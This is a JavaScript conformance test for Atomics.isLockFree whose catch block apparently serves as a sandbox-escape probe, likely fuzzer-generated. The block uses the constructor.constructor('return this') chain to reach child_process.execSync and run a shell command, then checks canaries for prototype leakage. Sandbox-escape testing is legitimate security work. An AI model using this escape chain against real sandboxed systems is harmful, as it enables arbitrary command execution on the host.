try {
    var isLockFree1;
    var isLockFree2;
    var isLockFree8;
    {
        isLockFree1 = Atomics.isLockFree(1);
        assert.sameValue(typeof isLockFree1, 'boolean', 'The value of `typeof isLockFree1` is "boolean"');
        assert.sameValue(Atomics.isLockFree(1), isLockFree1, 'Atomics.isLockFree(1) returns the value of `isLockFree1` (Atomics.isLockFree(1))');
    }
    ;
    {
        isLockFree2 = Atomics.isLockFree(2);
        assert.sameValue(typeof isLockFree2, 'boolean', 'The value of `typeof isLockFree2` is "boolean"');
        assert.sameValue(Atomics.isLockFree(2), isLockFree2, 'Atomics.isLockFree(2) returns the value of `isLockFree2` (Atomics.isLockFree(2))');
    }
    ;
    {
        let isLockFree4 = Atomics.isLockFree(4);
        assert.sameValue(typeof isLockFree4, 'boolean', 'The value of `typeof isLockFree4` is "boolean"');
        assert.sameValue(isLockFree4, true, 'The value of `isLockFree4` is true');
    }
    ;
    {
        isLockFree8 = Atomics.isLockFree(8);
        assert.sameValue(typeof isLockFree8, 'boolean', 'The value of `typeof isLockFree8` is "boolean"');
        assert.sameValue(Atomics.isLockFree(8), isLockFree8, 'Atomics.isLockFree(8) returns the value of `isLockFree8` (Atomics.isLockFree(8))');
    }
    ;
    {
        for (let i = 0; i < 12; i++) {
            if (![
                    1,
                    2,
                    4,
                    8
                ].includes(i)) {
                assert.sameValue(Atomics.isLockFree(i), false, 'Atomics.isLockFree(i) returns false');
            }
        }
    }
    ;
    assert.sameValue(Atomics.isLockFree(1), isLockFree1, 'Atomics.isLockFree(1) returns the value of `isLockFree1` (Atomics.isLockFree(1))');
    assert.sameValue(Atomics.isLockFree(2), isLockFree2, 'Atomics.isLockFree(2) returns the value of `isLockFree2` (Atomics.isLockFree(2))');
    assert.sameValue(Atomics.isLockFree(8), isLockFree8, 'Atomics.isLockFree(8) returns the value of `isLockFree8` (Atomics.isLockFree(8))');
    assert.sameValue(Atomics.isLockFree(3), false, 'Atomics.isLockFree(3) returns false');
    assert.sameValue(Atomics.isLockFree(4), true, 'Atomics.isLockFree(4) returns true');
    assert.sameValue(Atomics.isLockFree(5), false, 'Atomics.isLockFree(5) returns false');
    assert.sameValue(Atomics.isLockFree(6), false, 'Atomics.isLockFree(6) returns false');
    assert.sameValue(Atomics.isLockFree(7), false, 'Atomics.isLockFree(7) returns false');
    assert.sameValue(Atomics.isLockFree(9), false, 'Atomics.isLockFree(9) returns false');
    assert.sameValue(Atomics.isLockFree(10), false, 'Atomics.isLockFree(10) returns false');
    assert.sameValue(Atomics.isLockFree(11), false, 'Atomics.isLockFree(11) returns false');
    assert.sameValue(Atomics.isLockFree(12), false, 'Atomics.isLockFree(12) returns false');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}